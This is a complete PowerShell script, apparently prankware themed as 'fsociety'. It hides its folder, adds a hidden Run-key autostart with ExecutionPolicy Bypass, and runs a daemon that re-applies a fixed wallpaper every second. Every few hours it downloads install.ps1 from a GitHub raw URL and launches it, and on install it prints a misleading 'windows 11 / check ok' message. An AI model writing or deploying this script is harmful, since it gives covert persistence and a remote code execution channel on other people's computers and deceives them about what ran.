
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$RepoOwner = 'greattastychips'
$RepoName = 'fsociety'
$RepoUrl = "https://raw.githubusercontent.com/$RepoOwner/$RepoName/main"

$Root = Join-Path $env:LOCALAPPDATA '1234'
$ScriptPath = Join-Path $Root 'fs.ps1'
$WallpaperPath = Join-Path $Root '1234.png'
$ConfigPath = Join-Path $Root 'config.json'
$PidPath = Join-Path $Root 'daemon.pid'

$RunKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$PowerShellExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'

$Arguments = @($args | Where-Object { $_ -ne '-Daemon' })
$DaemonMode = $args -contains '-Daemon'

$Command = if ($Arguments.Count -gt 0) { [string]$Arguments[0] } else { 'install' }
$Value = if ($Arguments.Count -gt 1) { [string]$Arguments[1] } else { $null }
$ExtraValue = if ($Arguments.Count -gt 2) { [string]$Arguments[2] } else { $null }

function Get-Config {
    $defaults = @{
        interval = 1
        enabled = $true
        updateMinutes = 360
    }

    if (!(Test-Path -LiteralPath $ConfigPath)) {
        return $defaults
    }

    try {
        $c = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json

        if ($null -ne $c.interval) {
            $defaults.interval = [Math]::Max(1, [int]$c.interval)
        }

        if ($null -ne $c.enabled) {
            $defaults.enabled = [bool]$c.enabled
        }

        if ($null -ne $c.updateMinutes) {
            $defaults.updateMinutes = [Math]::Max(1, [int]$c.updateMinutes)
        }

        return $defaults
    } catch {
        throw 'The configuration file is invalid.'
    }
}

function Save-Config {
    param(
        [int]$Interval,
        [bool]$Enabled,
        [int]$UpdateMinutes = 360
    )

    if ($Interval -lt 1) {
        throw 'The wallpaper interval must be at least 1 second.'
    }

    if ($UpdateMinutes -lt 1) {
        throw 'The update interval must be at least 1 minute.'
    }

    $config = @{
        interval = $Interval
        enabled = $Enabled
        updateMinutes = $UpdateMinutes
    }

    $tempConfig = Join-Path $Root ([guid]::NewGuid().ToString() + '.json')

    try {
        $config |
            ConvertTo-Json |
            Set-Content -LiteralPath $tempConfig -Encoding UTF8

        Move-Item -LiteralPath $tempConfig -Destination $ConfigPath -Force
    } finally {
        Remove-Item -LiteralPath $tempConfig -Force -ErrorAction SilentlyContinue
    }
}

function Test-Png {
    param([string]$Path)

    if (!(Test-Path -LiteralPath $Path -PathType Leaf)) {
        return $false
    }

    try {
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        $signature = @(137, 80, 78, 71, 13, 10, 26, 10)

        if ($bytes.Length -lt 8) {
            return $false
        }

        for ($i = 0; $i -lt 8; $i++) {
            if ($bytes[$i] -ne $signature[$i]) {
                return $false
            }
        }

        return $true
    } catch {
        return $false
    }
}

function Download-Assets {
    param([switch]$ForUpdate)

    $tempScript = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.ps1')
    $tempImage = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.png')

    try {
        Invoke-WebRequest `
            -Uri "$RepoUrl/install.ps1" `
            -OutFile $tempScript `
            -UseBasicParsing `
            -ErrorAction Stop

        Invoke-WebRequest `
            -Uri "$RepoUrl/1234.png" `
            -OutFile $tempImage `
            -UseBasicParsing `
            -ErrorAction Stop

        $source = Get-Content -LiteralPath $tempScript -Raw

        if ($source -match "(?m)^\s*\`$RepoOwner\s*=\s*'YOUR_GITHUB_USERNAME'\s*$") {
            throw 'The downloaded installer contains a placeholder username.'
        }

        if ($source -notmatch 'function\s+Run-Daemon') {
            throw 'The downloaded installer failed validation.'
        }

        if (!(Test-Png -Path $tempImage)) {
            throw 'The downloaded wallpaper is not a valid PNG.'
        }

        New-Item -Path $Root -ItemType Directory -Force | Out-Null

        $scriptChanged = $true
        $imageChanged = $true

        if (Test-Path -LiteralPath $ScriptPath) {
            $scriptChanged = (
                (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
                (Get-FileHash -LiteralPath $tempScript -Algorithm SHA256).Hash
            )
        }

        if (Test-Path -LiteralPath $WallpaperPath) {
            $imageChanged = (
                (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
                (Get-FileHash -LiteralPath $tempImage -Algorithm SHA256).Hash
            )
        }

        if (!$ForUpdate -or $scriptChanged) {
            Copy-Item -LiteralPath $tempScript -Destination $ScriptPath -Force
        }

        if (!$ForUpdate -or $imageChanged) {
            Copy-Item -LiteralPath $tempImage -Destination $WallpaperPath -Force
        }

        return @{
            scriptChanged = $scriptChanged
            imageChanged = $imageChanged
        }
    } finally {
        Remove-Item -LiteralPath $tempScript, $tempImage -Force -ErrorAction SilentlyContinue
    }
}

function Set-Wallpaper {
    if (!(Test-Png -Path $WallpaperPath)) {
        throw 'The wallpaper is missing or invalid. Run fs update.'
    }

    Set-ItemProperty `
        -Path 'HKCU:\Control Panel\Desktop' `
        -Name Wallpaper `
        -Value $WallpaperPath

    Set-ItemProperty `
        -Path 'HKCU:\Control Panel\Desktop' `
        -Name WallpaperStyle `
        -Value '10'

    Set-ItemProperty `
        -Path 'HKCU:\Control Panel\Desktop' `
        -Name TileWallpaper `
        -Value '0'

    if (!('FsWallpaperNative' -as [type])) {
        Add-Type @'
using System;
using System.Runtime.InteropServices;
public static class FsWallpaperNative {
    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool SystemParametersInfo(int action, int param, string path, int flags);
}
'@ | Out-Null
    }

    $result = [FsWallpaperNative]::SystemParametersInfo(
        20,
        0,
        $WallpaperPath,
        3
    )

    if (!$result) {
        $code = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "Windows could not apply the wallpaper. Win32 error: $code"
    }
}

function Stop-Daemon {
    if (!(Test-Path -LiteralPath $PidPath)) {
        return
    }

    try {
        $oldPid = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()

        if ($oldPid -ne $PID) {
            $process = Get-Process -Id $oldPid -ErrorAction SilentlyContinue

            if ($process) {
                Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {}

    Remove-Item -LiteralPath $PidPath -Force -ErrorAction SilentlyContinue
}

function Set-Startup {
    New-Item -Path $RunKey -Force | Out-Null

    $startup = '"' + $PowerShellExe +
        '" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' +
        $ScriptPath + '" -Daemon'

    Set-ItemProperty -Path $RunKey -Name 'fs' -Value $startup
    Remove-ItemProperty -Path $RunKey -Name 'fsociety' -ErrorAction SilentlyContinue
}

function Remove-Startup {
    Remove-ItemProperty -Path $RunKey -Name 'fs' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $RunKey -Name 'fsociety' -ErrorAction SilentlyContinue
}

function Set-Command {
    $shimPath = Join-Path $Root 'fs.cmd'

    $shim = "@echo off`r`n`"$PowerShellExe`" -NoLogo -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" %*`r`n"
    Set-Content -LiteralPath $shimPath -Value $shim -Encoding ASCII

    Remove-Item -LiteralPath (Join-Path $Root 'fsociety.cmd') -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Root 'fsociety.bat') -Force -ErrorAction SilentlyContinue

    $userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
    $parts = @($userPath -split ';' | Where-Object { $_ })

    if (!($parts | Where-Object {
        $_.TrimEnd('\') -ieq $Root.TrimEnd('\')
    })) {
        [Environment]::SetEnvironmentVariable(
            'Path',
            (($parts + $Root) -join ';'),
            'User'
        )
    }

    if (!($env:Path -split ';' | Where-Object {
        $_.TrimEnd('\') -ieq $Root.TrimEnd('\')
    })) {
        $env:Path = "$Root;$env:Path"
    }
}

function Remove-CommandPath {
    $userPath = [Environment]::GetEnvironmentVariable('Path', 'User')

    $parts = @($userPath -split ';' | Where-Object {
        $_ -and $_.TrimEnd('\') -ine $Root.TrimEnd('\')
    })

    [Environment]::SetEnvironmentVariable(
        'Path',
        ($parts -join ';'),
        'User'
    )
}

function Start-Daemon {
    Stop-Daemon

    $process = Start-Process `
        -FilePath $PowerShellExe `
        -WindowStyle Hidden `
        -PassThru `
        -ArgumentList @(
            '-NoLogo',
            '-NoProfile',
            '-NonInteractive',
            '-ExecutionPolicy',
            'Bypass',
            '-File',
            "`"$ScriptPath`"",
            '-Daemon'
        )

    Start-Sleep -Milliseconds 700

    if ($process.HasExited) {
        throw 'The background process exited during startup.'
    }
}

function Update-InBackground {
    $tempScript = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.ps1')
    $tempImage = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + '.png')

    try {
        Invoke-WebRequest `
            -Uri "$RepoUrl/install.ps1" `
            -OutFile $tempScript `
            -UseBasicParsing `
            -ErrorAction Stop

        Invoke-WebRequest `
            -Uri "$RepoUrl/1234.png" `
            -OutFile $tempImage `
            -UseBasicParsing `
            -ErrorAction Stop

        $source = Get-Content -LiteralPath $tempScript -Raw

        if ($source -match "(?m)^\s*\`$RepoOwner\s*=\s*'YOUR_GITHUB_USERNAME'\s*$") {
            return $false
        }

        if ($source -notmatch 'function\s+Run-Daemon') {
            return $false
        }

        if (!(Test-Png -Path $tempImage)) {
            return $false
        }

        $scriptChanged = $true
        $imageChanged = $true

        if (Test-Path -LiteralPath $ScriptPath) {
            $scriptChanged = (
                (Get-FileHash -LiteralPath $ScriptPath -Algorithm SHA256).Hash -ne
                (Get-FileHash -LiteralPath $tempScript -Algorithm SHA256).Hash
            )
        }

        if (Test-Path -LiteralPath $WallpaperPath) {
            $imageChanged = (
                (Get-FileHash -LiteralPath $WallpaperPath -Algorithm SHA256).Hash -ne
                (Get-FileHash -LiteralPath $tempImage -Algorithm SHA256).Hash
            )
        }

        if ($imageChanged) {
            Copy-Item -LiteralPath $tempImage -Destination $WallpaperPath -Force

            try {
                Set-Wallpaper
            } catch {}
        }

        if ($scriptChanged) {
            Copy-Item -LiteralPath $tempScript -Destination $ScriptPath -Force

            Start-Process `
                -FilePath $PowerShellExe `
                -WindowStyle Hidden `
                -ArgumentList @(
                    '-NoLogo',
                    '-NoProfile',
                    '-NonInteractive',
                    '-ExecutionPolicy',
                    'Bypass',
                    '-File',
                    "`"$ScriptPath`"",
                    '-Daemon'
                ) | Out-Null

            return $true
        }

        return $false
    } catch {
        return $false
    } finally {
        Remove-Item -LiteralPath $tempScript, $tempImage -Force -ErrorAction SilentlyContinue
    }
}

function Run-Daemon {
    Set-Content -LiteralPath $PidPath -Value $PID -Encoding ASCII

    $lastUpdateCheck = Get-Date

    try {
        while ($true) {
            $config = Get-Config

            if (!$config.enabled) {
                break
            }

            if (Test-Png -Path $WallpaperPath) {
                try {
                    $current = (
                        Get-ItemProperty `
                            -Path 'HKCU:\Control Panel\Desktop' `
                            -Name Wallpaper `
                            -ErrorAction SilentlyContinue
                    ).Wallpaper

                    if ($current -ine $WallpaperPath) {
                        Set-Wallpaper
                    }
                } catch {}
            }

            if (((Get-Date) - $lastUpdateCheck).TotalMinutes -ge $config.updateMinutes) {
                $lastUpdateCheck = Get-Date

                if (Update-InBackground) {
                    break
                }
            }

            Start-Sleep -Seconds ([Math]::Max(1, [int]$config.interval))
        }
    } finally {
        try {
            $savedPid = (
                Get-Content -LiteralPath $PidPath -Raw -ErrorAction SilentlyContinue
            ).Trim()

            if ($savedPid -eq [string]$PID) {
                Remove-Item -LiteralPath $PidPath -Force -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

function Write-Success {
    [Console]::Out.WriteLine('windows 11')
    [Console]::Out.WriteLine('check ok')
}

function Install-Fs {
    if ($RepoOwner -eq 'YOUR_GITHUB_USERNAME') {
        throw 'Invalid GitHub username.'
    }

    New-Item -Path $Root -ItemType Directory -Force | Out-Null
    Download-Assets | Out-Null

    if (!(Test-Path -LiteralPath $ConfigPath)) {
        Save-Config -Interval 1 -Enabled $true -UpdateMinutes 360
    }

    Set-Command | Out-Null
    Set-Startup | Out-Null
    Set-Wallpaper

    $item = Get-Item -LiteralPath $Root -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden

    Start-Daemon
    Write-Success
}

function Update-Fs {
    $config = Get-Config

    Download-Assets -ForUpdate | Out-Null
    Set-Command | Out-Null
    Set-Startup | Out-Null

    if ($config.enabled) {
        Set-Wallpaper
        Start-Daemon
    }

    $item = Get-Item -LiteralPath $Root -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden

    Write-Success
}

function Set-UpdateTime {
    param([string]$Minutes)

    $parsedMinutes = 0

    if (
        [string]::IsNullOrWhiteSpace($Minutes) -or
        ![int]::TryParse($Minutes, [ref]$parsedMinutes) -or
        $parsedMinutes -lt 1
    ) {
        throw 'Usage: fs update time <minutes>'
    }

    $config = Get-Config

    Save-Config `
        -Interval $config.interval `
        -Enabled $config.enabled `
        -UpdateMinutes $parsedMinutes

    if ($config.enabled) {
        Start-Daemon
    }

    [Console]::Out.WriteLine("Update interval: $parsedMinutes minute(s)")
}

function Show-Help {
    $commands = @(
        'fs install'
        'fs update'
        'fs update time <minutes>'
        'fs time <seconds>'
        'fs on'
        'fs off'
        'fs set'
        'fs status'
        'fs help'
        'fs uninstall'
    )

    foreach ($entry in $commands) {
        [Console]::Out.WriteLine($entry)
    }
}

function Uninstall-Fs {
    Stop-Daemon
    Remove-Startup
    Remove-CommandPath

    Remove-Item -LiteralPath (Join-Path $Root 'fsociety.cmd') -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Root 'fsociety.bat') -Force -ErrorAction SilentlyContinue

    if (Test-Path -LiteralPath $Root) {
        $item = Get-Item -LiteralPath $Root -Force
        $item.Attributes = [System.IO.FileAttributes]::Directory
        Remove-Item -LiteralPath $Root -Recurse -Force
    }

    [Console]::Out.WriteLine('Uninstalled.')
}

try {
    if ($DaemonMode) {
        Run-Daemon
        exit 0
    }

    switch ($Command.ToLowerInvariant()) {
        'install' {
            Install-Fs
        }

        'update' {
            if ($Value -and $Value.ToLowerInvariant() -eq 'time') {
                Set-UpdateTime -Minutes $ExtraValue
            } else {
                Update-Fs
            }
        }

        'time' {
            $seconds = 0

            if (
                !$Value -or
                ![int]::TryParse($Value, [ref]$seconds) -or
                $seconds -lt 1
            ) {
                throw 'Usage: fs time <seconds>'
            }

            $config = Get-Config

            Save-Config `
                -Interval $seconds `
                -Enabled $config.enabled `
                -UpdateMinutes $config.updateMinutes

            if ($config.enabled) {
                Start-Daemon
            }

            [Console]::Out.WriteLine("Wallpaper interval: $seconds second(s)")
        }

        'on' {
            $config = Get-Config

            Save-Config `
                -Interval $config.interval `
                -Enabled $true `
                -UpdateMinutes $config.updateMinutes

            Set-Startup | Out-Null
            Set-Wallpaper
            Start-Daemon

            [Console]::Out.WriteLine('Enforcement enabled.')
        }

        'off' {
            $config = Get-Config

            Save-Config `
                -Interval $config.interval `
                -Enabled $false `
                -UpdateMinutes $config.updateMinutes

            Stop-Daemon
            Remove-Startup

            [Console]::Out.WriteLine('Enforcement disabled.')
        }

        'set' {
            Set-Wallpaper
            [Console]::Out.WriteLine('Wallpaper applied.')
        }

        'status' {
            $config = Get-Config
            $running = $false

            if (Test-Path -LiteralPath $PidPath) {
                try {
                    $id = [int](Get-Content -LiteralPath $PidPath -Raw).Trim()
                    $running = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
                } catch {}
            }

            [Console]::Out.WriteLine("Enabled: $($config.enabled)")
            [Console]::Out.WriteLine("Wallpaper interval: $($config.interval) second(s)")
            [Console]::Out.WriteLine("Update interval: $($config.updateMinutes) minute(s)")
            [Console]::Out.WriteLine("Background process running: $running")
            [Console]::Out.WriteLine("Wallpaper valid: $(Test-Png -Path $WallpaperPath)")
        }

        'help' {
            Show-Help
        }

        'uninstall' {
            Uninstall-Fs
        }

        default {
            throw "Unknown command '$Command'. Run fs help."
        }
    }

    exit 0
} catch {
    [Console]::Out.WriteLine("error: " + $_.Exception.Message)
    exit 1
}
